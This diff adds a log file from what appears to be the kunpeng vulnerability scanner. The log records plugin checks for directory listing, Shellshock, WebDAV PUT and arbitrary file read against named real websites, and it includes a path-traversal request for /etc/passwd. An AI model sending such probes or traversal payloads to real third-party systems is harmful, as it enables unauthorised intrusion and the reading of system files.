@@ -1,0 +1,30 @@
+
+ _
+| | ___   _ _ __  _ __   ___ _ __   __ _
+| |/ / | | | '_ \| '_ \ / _ \ '_ \ / _' |
+|   <| |_| | | | | |_) |  __/ | | | (_| |
+|_|\_\\__,_|_| |_| .__/ \___|_| |_|\__, |
+                 |_|               |___/
+
+[info] 14:04:51 log.go:44: [{"type": "web", "netloc": "http://www.cnnc.com.cn/", "target": "web", "meta": {"system": "", "pathlist": [], "filelist": [], "passlist": []}}]
+[info] 14:04:51 log.go:44: [{web http://www.cnnc.com.cn/ web { [] [] []}}]
+[info] 14:04:51 log.go:44: [new task: {web http://www.cnnc.com.cn/ web { [] [] []}}]
+[info] 14:04:51 log.go:44: [go plugin total: 31]
+[info] 14:04:51 log.go:44: [run plugin: web web目录浏览]
+[info] 14:04:51 log.go:44: [request do http://www.cnnc.com.cn/]
+[info] 14:04:51 log.go:44: [response code: 200 len: -1]
+[info] 14:04:51 log.go:44: [request do http://www.cnnc.com.cn//css/]
+[info] 14:05:01 log.go:44: [run plugin: web shellshock 破壳漏洞]
+[info] 14:05:01 log.go:44: [run plugin: web WebDav Put开启]
+[info] 14:05:01 log.go:44: [request do http://www.cnnc.com.cn//x3doms.txt]
+[info] 14:05:01 log.go:44: [response code: 200 len: 9596]
+[info] 14:05:01 log.go:44: [request do http://www.cnnc.com.cn//x3doms.txt]
+[info] 14:05:11 log.go:44: [run plugin: web WebServer 任意文件读取]
+[info] 14:05:11 log.go:44: [request do http://www.cnnc.com.cn//../../../../../../../../etc/passwd]
+[info] 14:05:21 log.go:44: [json plugin total: 11]
+[info] 14:05:21 log.go:44: [{"type": "service", "netloc": "http://www.jingruis.com/", "target": "jingruis", "meta": {"system": "", "pathlist": [], "filelist": [], "passlist": []}}]
+[info] 14:05:21 log.go:44: [{service http://www.jingruis.com/ jingruis { [] [] []}}]
+[info] 14:05:21 log.go:44: [new task: {service http://www.jingruis.com/ jingruis { [] [] []}}]
+b'20190527'
+[]
+[]
